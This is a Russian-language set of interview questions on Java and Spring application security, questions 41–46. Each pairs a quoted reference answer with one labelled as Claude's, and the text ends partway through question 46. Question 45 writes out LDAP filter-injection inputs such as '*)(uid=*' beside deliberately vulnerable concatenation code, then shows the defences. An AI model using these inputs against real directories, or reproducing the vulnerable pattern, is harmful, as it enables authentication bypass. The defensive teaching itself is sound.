# Безопасность приложений — часть 3 из 3

> Вопросы 41–60 (в части: 20). Всего в разделе: 60.
> Область знаний: [../knowledge-base/23-security.md](../knowledge-base/23-security.md)
> Правила: [RULES.md](RULES.md)
> Части: [ч.1](security-01.md) · [ч.2](security-02.md) · **ч.3**

---
### Вопрос 41. Как включить method security в Spring Security и чем @PreAuthorize отличается от @Secured? Почему аннотации безопасности не работают при вызове метода из того же класса (self-invocation), и как это исправить?

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [Method Security — Spring Security Reference (docs.spring.io)](https://docs.spring.io/spring-security/reference/servlet/authorization/method-security.html)

**Включение method security:**
Для активации необходимо аннотировать конфигурационный класс `@EnableMethodSecurity`. Spring Boot Starter Security **не активирует** метод-уровневую авторизацию автоматически.

```java
@EnableMethodSecurity
@Configuration
public class SecurityConfig { }
```

**@PreAuthorize vs @Secured:**

| Аспект | @PreAuthorize | @Secured |
|--------|---------------|----------|
| Статус | Актуальная, рекомендованная | Устаревшая (legacy) |
| Выражения | Полная поддержка SpEL | Только имена ролей/авторитетов |
| Включена по умолчанию | Да (при `@EnableMethodSecurity`) | Нет, требует `securedEnabled = true` |

`@Secured` включается отдельно:
```java
@EnableMethodSecurity(securedEnabled = true)
```

**Проблема self-invocation:**
Метод-уровневая безопасность реализована через Spring AOP-прокси. Когда бин оборачивается в прокси, все внешние вызовы проходят через него и проверяются. Но вызов `this.method2()` внутри класса обходит прокси полностью — аннотация `@PreAuthorize` на `method2` не выполняется.

**Решение 1 — Self-injection (рекомендуется):**
```java
@Service
public class MyService {
    @Autowired
    private MyService self;

    @PreAuthorize("hasRole('ADMIN')")
    public void method1() {
        self.method2(); // вызов через прокси
    }

    @PreAuthorize("hasRole('USER')")
    public void method2() { }
}
```

**Решение 2 — AspectJ compile-time/load-time weaving:**
```java
@EnableMethodSecurity(mode = AdviceMode.ASPECTJ)
```
При использовании AspectJ байт-код аспекта внедряется напрямую в классы, минуя прокси-механизм, что устраняет проблему self-invocation полностью.

**Решение 3 — Вынесение метода в отдельный бин:**
Разделить класс на два отдельных Spring-бина — тогда вызов между ними всегда проходит через прокси.

#### Ответ от Claude

**Как включить method security:**

Начиная с Spring Security 5.6, рекомендуемый способ — `@EnableMethodSecurity` (заменяет устаревший `@EnableGlobalMethodSecurity`). Аннотация добавляется на `@Configuration`-класс:

```java
@EnableMethodSecurity          // включает @PreAuthorize и @PostAuthorize
@Configuration
public class SecurityConfig { }
```

Для включения `@Secured` и `@RolesAllowed` (JSR-250) используются флаги:
```java
@EnableMethodSecurity(securedEnabled = true, jsr250Enabled = true)
```

**Чем @PreAuthorize отличается от @Secured:**

1. **SpEL-выражения:** `@PreAuthorize` поддерживает полный язык Spring Expression Language — можно проверять аргументы методов, вызывать бины, комбинировать условия: `@PreAuthorize("hasRole('ADMIN') or #userId == authentication.principal.id")`. `@Secured` принимает только строковые имена ролей: `@Secured("ROLE_ADMIN")` — никакой логики, только прямое сравнение.

2. **Статус:** `@Secured` — legacy-аннотация, `@PreAuthorize` — основная, поддерживаемая в современных версиях.

3. **Включение:** `@PreAuthorize` активна сразу при `@EnableMethodSecurity`; `@Secured` требует `securedEnabled = true`.

4. **Доступ к аргументам:** `@PreAuthorize` позволяет ссылаться на параметры через `#paramName`; `@Secured` — не позволяет.

**Почему self-invocation не работает:**

Spring метод-уровневую безопасность реализует через AOP-прокси (по умолчанию — CGLIB или JDK Dynamic Proxy). При старте приложения Spring оборачивает ваш бин в прокси-объект. Когда внешний код вызывает метод бина, вызов идёт через прокси, который применяет advice (в данном случае — проверку авторизации). Однако когда метод внутри класса вызывает другой метод того же класса через `this`, он обращается напрямую к объекту, минуя прокси. Прокси не участвует — проверка безопасности не выполняется.

```java
@Service
public class OrderService {
    public void placeOrder() {
        cancelOrder(1L); // this.cancelOrder() — прокси обходится, @PreAuthorize игнорируется
    }

    @PreAuthorize("hasRole('ADMIN')")
    public void cancelOrder(Long id) { ... }
}
```

**Способы исправления:**

1. **Self-injection** — внедрить сам бин через `@Autowired` и использовать его для вызова:
```java
@Autowired private OrderService self;
// ...
self.cancelOrder(1L); // вызов через прокси
```
Работает, но выглядит нетипично. Необходимо избегать циклических зависимостей — для этого можно использовать `@Lazy`.

2. **Вынесение в отдельный бин** (рекомендуется для чистоты архитектуры) — метод с аннотацией безопасности переносится в отдельный `@Service`-класс, который затем внедряется как зависимость. Все вызовы через зависимость проходят через прокси.

3. **AspectJ mode** — переключение с прокси-based AOP на компиляторное или load-time weaving:
```java
@EnableMethodSecurity(mode = AdviceMode.ASPECTJ)
```
Это полностью устраняет ограничение, поскольку AspectJ внедряет код непосредственно в байт-код класса. Требует дополнительной настройки build-процесса (aspectj-maven-plugin или агент JVM).

**Расхождений между источниками не обнаружено.** Официальная документация Spring Security и Baeldung согласованно описывают проблему и решения.

---

### Вопрос 42. Что такое @PostAuthorize и @PostFilter в Spring Security? Приведите сценарий, где нужен именно @PostAuthorize, а не @PreAuthorize, и объясните, чем это опасно с точки зрения производительности.

**Категория:** Безопасность · **Уровень:** Senior

#### Оригинальный ответ из интернета
> Источник: [Method Security — Spring Security Reference (docs.spring.io)](https://docs.spring.io/spring-security/reference/servlet/authorization/method-security.html)

**@PostAuthorize** — аннотация, которая выполняет проверку авторизации **после** выполнения метода, используя возвращённое значение через встроенную переменную `returnObject`:

```java
@Component
public class BankService {
    @PostAuthorize("returnObject.owner == authentication.name")
    public Account readAccount(Long id) {
        return accounts.findById(id);
    }
}
```
Метод выполняется полностью (в том числе обращение к БД), затем Spring Security вычисляет выражение. Если условие `false` — выбрасывается `AccessDeniedException`.

**@PostFilter** — аннотация для фильтрации коллекций, массивов, Map, Stream и Optional в возвращаемом значении. Применяет выражение к каждому элементу коллекции через `filterObject`:

```java
@PostFilter("filterObject.owner == authentication.name")
public Collection<Account> readAccounts(String... ids) {
    return accountRepository.findByIds(ids); // загружает все, затем фильтрует в памяти
}
```

**Производительность:** официальная документация прямо указывает: фильтрация в памяти может быть дорогостоящей; рекомендуется переносить фильтрацию на уровень БД-запроса.

**Проблема с @PostAuthorize и записями в БД (из официальной документации):**
Не рекомендуется совмещать `@PostAuthorize` с методами, выполняющими запись, так как транзакция фиксируется до проверки авторизации. Если требуется совместное использование с `@Transactional`, порядок interceptor-ов необходимо явно контролировать:
```java
@EnableTransactionManagement(order = 1)
@EnableMethodSecurity(order = 2)
@Configuration
public class SecurityConfig { }
```

#### Ответ от Claude

**@PostAuthorize:**

Аннотация выполняет проверку авторизации после того, как метод завершил работу. В SpEL-выражении доступна переменная `returnObject`, представляющая возвращённый объект. Если выражение вычисляется в `false`, Spring Security выбрасывает `AccessDeniedException` — но метод к этому моменту уже выполнился.

```java
@PostAuthorize("returnObject.owner == authentication.name")
public Account readAccount(Long id) {
    return accountRepository.findById(id).orElseThrow();
}
```

**@PostFilter:**

Аннотация фильтрует элементы коллекции (Collection, Array, Map, Stream, Optional), возвращённой методом. Spring Security итерирует коллекцию и удаляет элементы, для которых `filterObject`-выражение возвращает `false`. Фильтрация выполняется **в памяти** после того, как все данные уже загружены из БД.

```java
@PostFilter("filterObject.owner == authentication.name")
public List<Document> getDocuments() {
    return documentRepository.findAll(); // загружает ВСЕ записи, потом фильтрует
}
```

**Сценарий, где нужен именно @PostAuthorize, а не @PreAuthorize:**

`@PreAuthorize` работает только с информацией, доступной **до** вызова метода: роли пользователя, аргументы метода. Однако бывают ситуации, когда авторизационное решение зависит от **содержимого** возвращаемого объекта, которого ещё нет до вызова.

Классический пример — проверка владельца ресурса при загрузке по ID:
```java
// @PreAuthorize НЕ подходит: мы не знаем заранее, кому принадлежит запись с id=X
@PostAuthorize("returnObject.createdBy == authentication.name or hasRole('ADMIN')")
public Order getOrder(Long id) {
    return orderRepository.findById(id).orElseThrow();
}
```
До выполнения метода мы знаем только `id`. Проверить, что запись принадлежит текущему пользователю, можно лишь после её загрузки. `@PreAuthorize("...")` с `#id` не поможет — мы не знаем владельца по одному только id без запроса в БД.

**Почему это опасно с точки зрения производительности:**

1. **Метод всегда выполняется полностью.** Даже если пользователь не имеет права на доступ, БД-запрос уже выполнен, сеть/CPU использованы, транзакция открыта.

2. **Проблема с записью и транзакциями.** Если метод выполняет DML-операцию (INSERT, UPDATE, DELETE) и аннотирован `@Transactional`, транзакция фиксируется (commit) раньше, чем Spring Security выполнит проверку. Данные окажутся в БД даже при отказе в авторизации. Для корректного поведения требуется явное управление порядком interceptor-ов (`@EnableTransactionManagement(order = 1)`, `@EnableMethodSecurity(order = 2)`) — но и это не спасает при методах-записях, поскольку к моменту проверки ресурс уже изменён.

3. **@PostFilter и проблема N+1 в памяти.** `@PostFilter` загружает **весь** набор данных из БД и затем фильтрует в JVM. При тысячах записей это означает избыточный трафик к БД, перегрузку heap и риск OOM. Правильное решение — переносить условие фильтрации в JPQL/SQL-запрос:
```java
// Вместо @PostFilter — фильтрация на уровне запроса:
List<Document> findByOwner(String owner);
```

4. **Нет возможности short-circuit.** `@PreAuthorize` при неудаче мгновенно прерывает вызов. `@PostAuthorize` не имеет такой возможности — вся работа уже сделана.

**Итог:** `@PostAuthorize` оправдан только для read-операций, когда решение об авторизации невозможно принять без данных из БД, и когда объём загружаемых данных невелик. Для write-операций использовать `@PostAuthorize` категорически не рекомендуется. `@PostFilter` следует применять только для небольших коллекций; для больших объёмов данных обязательна фильтрация на уровне БД-запроса.

---
### Вопрос 43. Как правильно настроить CORS в Spring Security? Чем отличается конфигурация через @CrossOrigin от CorsConfigurationSource в SecurityFilterChain? Почему CORS-заголовки не добавляются к rejected-запросам, если CORS настроен вне Spring Security?

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [CORS :: Spring Security — docs.spring.io](https://docs.spring.io/spring-security/reference/servlet/integrations/cors.html)

Spring Framework предоставляет полноценную поддержку CORS. **CORS должен обрабатываться до Spring Security**, потому что preflight-запросы не содержат куки (например, `JSESSIONID`). Если Spring Security обрабатывает запрос первым без куки, он определяет пользователя как неаутентифицированного и отклоняет запрос.

Самый простой способ гарантировать, что CORS обрабатывается первым — использовать `CorsFilter` с `CorsConfigurationSource`. Spring Security автоматически настраивает CORS, если присутствует экземпляр `UrlBasedCorsConfigurationSource`:

```java
@Bean
UrlBasedCorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration configuration = new CorsConfiguration();
    configuration.setAllowedOrigins(Arrays.asList("https://example.com"));
    configuration.setAllowedMethods(Arrays.asList("GET","POST"));
    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", configuration);
    return source;
}
```

Если вы используете поддержку CORS в Spring MVC, можно не указывать `CorsConfigurationSource` — Spring Security использует конфигурацию CORS, предоставленную Spring MVC:

```java
@Configuration
@EnableWebSecurity
public class WebSecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // если Spring MVC есть в classpath и CorsConfigurationSource не задан,
            // Spring Security использует конфигурацию CORS из Spring MVC
            .cors(withDefaults())
            ...
        return http.build();
    }
}
```

При наличии нескольких бинов `CorsConfigurationSource` нужно явно передавать нужный в каждый `SecurityFilterChain`:

```java
@Bean
@Order(0)
public SecurityFilterChain apiFilterChain(HttpSecurity http) throws Exception {
    http
        .securityMatcher("/api/**")
        .cors((cors) -> cors.configurationSource(apiConfigurationSource()))
        ...
    return http.build();
}
```

#### Ответ от Claude

**Три подхода к настройке CORS и ключевые различия**

**1. `@CrossOrigin` (аннотация Spring MVC)**

Аннотация `@CrossOrigin` работает на уровне контроллера или отдельного метода и является частью Spring MVC, а не Spring Security:

```java
@CrossOrigin(origins = "https://example.com", methods = {RequestMethod.GET, RequestMethod.POST})
@RestController
public class UserController { ... }
```

Эта конфигурация обрабатывается `DispatcherServlet` в рамках Spring MVC. Она действует только тогда, когда запрос успешно добрался до слоя MVC — то есть уже прошёл сквозь Spring Security Filter Chain.

**2. `CorsConfigurationSource` в `SecurityFilterChain`**

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .cors((cors) -> cors.configurationSource(corsConfigurationSource()))
        .authorizeHttpRequests(auth -> auth.anyRequest().authenticated())
        ...
    return http.build();
}

@Bean
UrlBasedCorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("https://example.com"));
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS"));
    config.setAllowedHeaders(List.of("*"));
    config.setAllowCredentials(true);
    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return source;
}
```

Вызов `.cors()` добавляет `CorsFilter` в цепочку фильтров Spring Security **перед** фильтрами аутентификации и авторизации. CORS-заголовки проставляются для всех ответов, включая ответы об ошибках (401, 403).

**Почему CORS-заголовки не добавляются к rejected-запросам, если CORS настроен только через `@CrossOrigin`**

Архитектурная причина:

```
Входящий запрос
      |
[Spring Security Filter Chain]
      |
   CorsFilter  <-- здесь добавляются CORS-заголовки (если настроен через .cors())
      |
   AuthenticationFilter
      |
   AuthorizationFilter  <-- если здесь запрос отклонён (401/403)...
      |
[DispatcherServlet]
      |
   @CrossOrigin  <-- ...сюда запрос никогда не доходит
```

Когда CORS настроен только через `@CrossOrigin`, а запрос отклоняется Spring Security на этапе авторизации (например, отсутствует JWT-токен), ответ уходит клиенту **без** `Access-Control-Allow-Origin` и других CORS-заголовков. Браузер получает ответ без CORS-заголовков и блокирует его, не показывая реальный статус-код (401/403). Разработчик видит CORS-ошибку вместо ошибки аутентификации.

**Сводная таблица различий**

| Критерий | `@CrossOrigin` | `CorsConfigurationSource` в Security |
|---|---|---|
| Уровень обработки | Spring MVC (DispatcherServlet) | Spring Security Filter Chain |
| Порядок выполнения | После фильтров безопасности | До фильтров безопасности |
| CORS-заголовки в 401/403 | Нет | Да |
| Гранулярность | Per-controller / per-method | Глобально или per-SecurityFilterChain |
| Preflight (OPTIONS) | Обрабатывает MVC | Перехватывается CorsFilter до авторизации |

**Важно:** отключение CORS через `.cors(CorsConfigurer::disable)` не убирает CORS-защиту браузера — оно убирает поддержку CORS в Spring Security, что лишь ломает легитимные кросс-доменные запросы.

---

### Вопрос 44. Что такое preflight-запрос в CORS и почему он важен для безопасности? Как Spring Security обрабатывает OPTIONS-запросы и что произойдёт, если не разрешить preflight до применения правил авторизации?

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [CORS :: Spring Framework — docs.spring.io](https://docs.spring.io/spring-framework/reference/web/webmvc-cors.html)

Реализации `HandlerMapping` в Spring MVC предоставляют встроенную поддержку CORS. После успешного сопоставления запроса с обработчиком реализации `HandlerMapping` проверяют конфигурацию CORS для данного запроса и обработчика и предпринимают дальнейшие действия. **Preflight-запросы обрабатываются напрямую**, тогда как простые и фактические CORS-запросы перехватываются, валидируются и получают необходимые CORS-заголовки в ответе.

Конфигурация CORS с учётными данными устанавливает уровень доверия к настроенным доменам. Использование CORS с credentialed-запросами требует включения `allowedCredentials`. Следует учитывать, что эта опция устанавливает высокий уровень доверия к настроенным доменам и также увеличивает поверхность атаки веб-приложения, раскрывая конфиденциальную пользовательскую информацию — такую как куки и CSRF-токены.

Ключевые моменты безопасности:
- Символы подстановки (`*`) **не авторизованы в `allowedOrigins`** при включённых credentials
- Используйте `allowOriginPatterns` для безопасного сопоставления с динамическими источниками
- По возможности настраивайте конечный набор источников вместо подстановочных знаков

По умолчанию конфигурация Spring MVC CORS включает все источники, все заголовки, методы `GET`, `HEAD` и `POST`, `maxAge` 30 минут. `allowCredentials` по умолчанию **отключён** из соображений безопасности.

#### Ответ от Claude

**Что такое preflight-запрос**

Preflight-запрос — это автоматический предварительный запрос, который браузер отправляет методом `OPTIONS` перед отправкой фактического кросс-доменного запроса. Браузер инициирует preflight, если запрос не является «простым» (simple request): используются методы `PUT`, `DELETE`, `PATCH`, нестандартные заголовки (например, `Authorization`, `Content-Type: application/json`), или заголовки с учётными данными.

Пример preflight-запроса:
```
OPTIONS /api/users HTTP/1.1
Host: api.example.com
Origin: https://frontend.example.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization, Content-Type
```

Ожидаемый ответ сервера:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://frontend.example.com
Access-Control-Allow-Methods: GET, POST, DELETE
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Max-Age: 3600
```

**Роль preflight в безопасности**

Preflight защищает от CSRF-подобных атак на API. До появления preflight-механизма браузер мог отправить разрушительный `DELETE`-запрос с cookies жертвы на сторонний сайт, и сервер был обязан его обработать. Preflight добавляет «переговорный» этап: браузер сначала спрашивает сервер, разрешает ли он такой запрос от данного источника. Если сервер не отвечает разрешением — браузер не отправляет фактический запрос.

**Как Spring Security обрабатывает OPTIONS-запросы**

Spring Security применяет правила авторизации ко **всем** запросам, включая `OPTIONS`. Если CORS не настроен должным образом в цепочке фильтров, preflight-запрос попадает под проверку авторизации.

Проблема: preflight-запрос по спецификации браузера **не содержит cookies и токенов**. Spring Security видит запрос без токена авторизации и возвращает `401 Unauthorized`. Браузер получает ответ без CORS-заголовков и блокирует отправку фактического запроса. Пользователь видит CORS-ошибку.

**Правильная конфигурация через `.cors()`**

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .cors(cors -> cors.configurationSource(corsConfigurationSource()))
        .authorizeHttpRequests(auth -> auth
            .anyRequest().authenticated()
        )
        .httpBasic(withDefaults());
    return http.build();
}

@Bean
UrlBasedCorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of("https://frontend.example.com"));
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS"));
    config.setAllowedHeaders(List.of("Authorization", "Content-Type"));
    config.setAllowCredentials(true);
    config.setMaxAge(3600L);
    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return source;
}
```

Вызов `.cors()` добавляет `CorsFilter` в начало Security Filter Chain. `CorsFilter` перехватывает OPTIONS-запросы, проверяет CORS-конфигурацию и возвращает корректный ответ **до** выполнения любых проверок аутентификации или авторизации.

**Что произойдёт без корректной настройки**

| Сценарий | Результат |
|---|---|
| CORS не настроен вообще | OPTIONS → 403, фактический запрос не отправляется |
| CORS только через `@CrossOrigin`, без `.cors()` в Security | OPTIONS → 401 (нет токена), CORS-заголовков в ответе нет |
| `.cors(withDefaults())` + Spring MVC `@CrossOrigin` | OPTIONS обрабатывается корректно |
| `.cors()` + `CorsConfigurationSource` в Security | Полная корректная обработка, CORS-заголовки добавляются ко всем ответам |

**Расхождение между источниками:** В старых версиях Spring Security (до 5.x) требовалось явно разрешать OPTIONS-запросы через `permitAll()`. В современных версиях (6.x) `.cors()` с правильно настроенным `CorsConfigurationSource` достаточно — `CorsFilter` обрабатывает OPTIONS до авторизационных фильтров.

---

### Вопрос 45. Что такое LDAP-инъекция? Чем она отличается от SQL-инъекции и почему стандартный escaping строк недостаточен? Покажите уязвимый LDAP-запрос и способ его защиты в Java.

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [LDAP Injection Prevention Cheat Sheet — OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)

LDAP-инъекция — это атака, используемая для эксплуатации веб-приложений, которые строят LDAP-выражения на основе пользовательского ввода. LDAP-инъекция возникает вследствие недостаточной санитизации и валидации входных данных и позволяет злоумышленникам получать ограниченную информацию с помощью сервиса каталогов.

Два ключевых фактора, обусловливающих распространённость LDAP-инъекций:
1. Отсутствие безопасных параметризованных интерфейсов LDAP-запросов.
2. Широкое использование LDAP для аутентификации пользователей в системах.

**Два разных контекста экранирования в LDAP:**

- **Distinguished Name (DN)**: уникальные идентификаторы, напоминающие иерархические пути. Специальные символы, требующие экранирования: `\ # + < > , ; " =` и начальные/конечные пробелы.
- **Фильтры поиска**: булевы запросы в префиксной нотации. Специальные символы: `* ( ) \ NUL`. RFC4515 определяет спецификацию фильтров поиска.

Применение DN-экранирования к фильтрам поиска (или наоборот) создаёт уязвимости.

**Уязвимый пример (конкатенация строк):**
```java
String filter = "(&(uid=" + userInput + ")(objectClass=person))";
NamingEnumeration<SearchResult> results =
    ctx.search("ou=users,dc=example,dc=com", filter, controls);
```

Атакующий, передав `*` или `)(uid=*`, может изменить логику фильтра, обойдя аутентификацию или получив непредусмотренные результаты.

**Защита: параметризованные запросы в Java**
```java
String filter = "(&(uid={0})(objectClass=person))";
NamingEnumeration<SearchResult> results =
    ctx.search("ou=users,dc=example,dc=com", filter,
        new Object[]{ userInput }, controls);
```

Параметризованный подход автоматически обрабатывает экранирование, рассматривая пользовательский ввод как данные, а не как синтаксис запроса.

**Защита: allowlist-валидация**
```java
if (!userSN.matches("[\\w\\s]*")) {
    throw new IllegalArgumentException("Invalid input");
}
String filter = "(sn=" + userSN + ")";
```

Дополнительные защитные меры:
- **Минимальные привилегии**: ограничение прав учётной записи для LDAP-привязки.
- **Bind-аутентификация**: требование валидных учётных данных предотвращает анонимную эксплуатацию.

#### Ответ от Claude

**Что такое LDAP-инъекция**

LDAP-инъекция (Lightweight Directory Access Protocol Injection) — атака на приложения, которые динамически строят LDAP-запросы путём конкатенации пользовательского ввода. Атакующий вставляет специальные символы LDAP-синтаксиса, изменяя структуру и семантику запроса. Последствия: обход аутентификации, несанкционированный доступ к данным каталога, модификация записей.

**Отличие от SQL-инъекции**

Концептуально обе атаки идентичны — вставка управляющих символов в запрос. Технические различия:

| Аспект | SQL-инъекция | LDAP-инъекция |
|---|---|---|
| Целевая система | Реляционная СУБД | Сервис каталогов (Active Directory, OpenLDAP) |
| Синтаксис запросов | SQL (текстовый) | LDAP-фильтры (RFC4515) и DN (RFC4514) |
| Параметризация | PreparedStatement, JPA | Нет стандартного аналога PreparedStatement |
| Контексты экранирования | Один (SQL) | Два: DN и Search Filter — разные правила |
| Специальные символы | `'`, `"`, `--`, `;` | DN: `\ # + < > , ; " =`; Filter: `* ( ) \ NUL` |

Отсутствие стандартного параметризованного API (аналога JDBC `PreparedStatement`) делает LDAP-инъекцию особенно опасной: разработчики вынуждены вручную экранировать строки.

**Почему стандартный строковый escaping недостаточен**

В LDAP существуют **два независимых контекста** с разными наборами спецсимволов и правилами экранирования:

1. **Distinguished Name (DN)** — идентификатор записи, например `cn=John Doe,ou=users,dc=example,dc=com`. Экранирование по RFC4514.
2. **Search Filter** — логическое выражение, например `(&(uid=john)(objectClass=person))`. Экранирование по RFC4515.

Пример неправильного экранирования: если разработчик экранирует только символы `'` и `"` (как в SQL), атакующий использует `*`, `(`, `)` для манипуляции фильтрами поиска — эти символы остаются незащищёнными.

**Уязвимый пример**

```java
// УЯЗВИМО: прямая конкатенация
public boolean authenticate(String username, String password) throws NamingException {
    String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";
    // Атакующий вводит username = "*)(uid=*"
    // Итоговый фильтр: (&(uid=*)(uid=*)(userPassword=...))
    // Возвращает всех пользователей — аутентификация обойдена
    NamingEnumeration<SearchResult> results =
        ctx.search("ou=users,dc=example,dc=com", filter, controls);
    return results.hasMore();
}
```

Атака: `username = *)(|(uid=*` даёт фильтр `(&(uid=*)(|(uid=*)(userPassword=...))` — возвращает все записи.

**Защита: параметризованный поиск через JNDI**

`DirContext.search()` принимает перегрузку с массивом аргументов, которая выполняет безопасную подстановку:

```java
// БЕЗОПАСНО: параметризованный запрос
public boolean authenticate(String username, String password) throws NamingException {
    String filter = "(&(uid={0})(userPassword={1}))";
    Object[] filterArgs = new Object[]{ username, password };
    SearchControls controls = new SearchControls();
    controls.setSearchScope(SearchControls.SUBTREE_SCOPE);

    NamingEnumeration<SearchResult> results =
        ctx.search("ou=users,dc=example,dc=com", filter, filterArgs, controls);
    return results.hasMore();
}
```

`DirContext.search(String name, String filterExpr, Object[] filterArgs, SearchControls cons)` — при передаче `filterArgs` JNDI автоматически экранирует аргументы по правилам RFC4515 (для search filter). Пользовательский ввод никогда не интерпретируется как часть синтаксиса фильтра.

**Защита DN-параметров**

Для динамических DN (например, при поиске пользователя по базовому DN) требуется отдельное экранирование по RFC4514. Используйте OWASP ESAPI Java Encoder:

```java
import org.owasp.esapi.Encoder;
import org.owasp.esapi.ESAPI;

Encoder encoder = ESAPI.encoder();
// Для search filter
String safeFilter = "(uid=" + encoder.encodeForLDAP(userInput) + ")";
// Для DN
String safeDN = encoder.encodeForDN(userInput);
```

**Дополнительные защитные меры**

- **Allowlist-валидация**: ограничение входных данных допустимым набором символов до передачи в LDAP (`[a-zA-Z0-9._-]`).
- **Минимальные привилегии**: учётная запись для LDAP-привязки должна иметь только права на чтение необходимых атрибутов.
- **Spring LDAP**: библиотека `spring-ldap` предоставляет `LdapQueryBuilder` с автоматическим экранированием:

```java
import static org.springframework.ldap.query.LdapQueryBuilder.query;

LdapQuery ldapQuery = query()
    .base("ou=users")
    .where("uid").is(username);
List<User> users = ldapTemplate.find(ldapQuery, User.class);
```

`LdapQueryBuilder` экранирует значения автоматически, исключая инъекцию на уровне API.

**Расхождение между источниками:** OWASP Cheat Sheet рекомендует `ESAPI.encoder().encodeForLDAP()` как основной метод ручного экранирования. Документация Spring LDAP продвигает `LdapQueryBuilder` как предпочтительный высокоуровневый подход, полностью избавляющий от ручного экранирования. Оба подхода валидны; выбор зависит от наличия Spring LDAP в проекте.

---
### Вопрос 46. Как безопасно хранить секреты (database passwords, API keys) в продакшн-приложении на Java? Сравните подходы: environment variables, Spring Cloud Vault (HashiCorp Vault), Kubernetes Secrets, AWS Secrets Manager. Какие из них считаются production-grade и почему?

**Категория:** Безопасность · **Уровень:** Senior

#### Оригинальный ответ из интернета
> Источник: [AWS Secrets Manager best practices](https://docs.aws.amazon.com/secretsmanager/latest/userguide/best-practices.html)

AWS Secrets Manager шифрует секреты в покое с помощью ключей AWS KMS, которыми владеет пользователь. При получении секрета Secrets Manager расшифровывает его и передаёт по защищённому TLS-каналу в локальное окружение. Рекомендуемые практики от AWS:

- **Кэширование**: использовать клиентское кэширование (например, Java-клиент с кэшированием), чтобы не обращаться к Secrets Manager при каждом запросе.
- **Ротация**: настроить автоматическую ротацию с частотой вплоть до каждых четырёх часов. Поддерживаются стратегии «Single user» и «Alternating users».
- **Принцип наименьших привилегий**: ограничивать доступ к секретам через IAM-политики; использовать атрибутивный контроль доступа (ABAC).
- **Приватные сети**: запускать инфраструктуру в VPC и обращаться к Secrets Manager через интерфейсный VPC endpoint, чтобы трафик не выходил в публичный интернет.
- **Мониторинг**: интегрировать с CloudTrail, CloudWatch и GuardDuty для аудита и обнаружения угроз.
- **Блокировка широкого доступа**: использовать условие `secretsmanager:BlockPublicPolicy: true` в политиках.

#### Ответ от Claude

**Проблема хранения секретов**

Жёстко закодированные пароли и ключи в коде или конфигурационных файлах — наиболее распространённая причина утечек данных. Ниже сравниваются четыре основных подхода.

---

**1. Environment Variables (переменные окружения)**

Переменные окружения — исторически первый шаг «выше» хардкода. Принцип 12-factor App рекомендует хранить конфигурацию в окружении.

Плюсы:
- Простота: не требует дополнительной инфраструктуры.
- Поддержка любых платформ и языков.

Минусы:
- Переменные видны всем процессам той же ОС и часто попадают в логи при сбое.
- Нет встроенного механизма ротации.
- В контейнерных окружениях значения нередко оседают в манифестах (`docker-compose.yml`, CI-пайплайнах).
- Не считаются production-grade для критичных секретов в изолированном виде — без дополнительных мер.

---

**2. Kubernetes Secrets**

Kubernetes Secrets хранят данные в формате base64. По умолчанию значения не зашифрованы — хранятся в открытом виде в etcd.

```bash
# base64 легко декодируется
echo "bXlwYXNzd29yZA==" | base64 -d
# mypassword
```

Источник: [Good practices for Kubernetes Secrets](https://kubernetes.io/docs/concepts/security/secrets-good-practices/) (kubernetes.io)

Чтобы Kubernetes Secrets были production-grade, необходимо:
- Включить **Encryption at Rest** для etcd (EncryptionConfiguration).
- Настроить строгий **RBAC**: ограничить `watch`/`list` только для привилегированных компонентов.
- Использовать короткоживущие секреты.
- Рассмотреть интеграцию через **Secrets Store CSI Driver** с внешним хранилищем (Vault, AWS Secrets Manager).

Без активной защиты Kubernetes Secrets обеспечивают лишь изоляцию на уровне namespace, но не реальную конфиденциальность.

---

**3. Spring Cloud Vault / HashiCorp Vault**

Spring Cloud Vault Config обеспечивает клиентскую поддержку для централизованного управления секретами через HashiCorp Vault. Vault поддерживает **динамические секреты**: вместо хранения пароля к базе данных он генерирует временные учётные данные с заданным TTL.

Конфигурация в `application.properties`:

```properties
spring.cloud.vault.uri=https://vault.example.com
spring.cloud.vault.authentication=KUBERNETES
spring.cloud.vault.kubernetes.role=my-app-role
spring.cloud.vault.database.enabled=true
spring.cloud.vault.database.role=my-db-role
```

Источник: [Spring Cloud Vault Reference Documentation](https://docs.spring.io/spring-cloud-vault/reference/) (docs.spring.io)

Ключевые возможности:
- **Динамические секреты**: база данных, AWS, PKI-сертификаты — все генерируются «на лету» с автоматическим истечением срока.
- **Методы аутентификации**: AppRole (для сервисов), Kubernetes (нативная интеграция с ServiceAccount), LDAP.
- **Аудит**: полный лог каждого обращения к секрету.
- **Политики**: детализированный контроль доступа.

Недостаток: Vault — критически важный компонент инфраструктуры. Если он недоступен, поды не смогут стартовать (если не использовать кэширование). Требует HA-настройки.

---

**4. AWS Secrets Manager**

Полностью управляемый сервис AWS. Шифрование через AWS KMS, автоматическая ротация (от каждых 4 часов), интеграция с RDS, Redshift, DocumentDB.

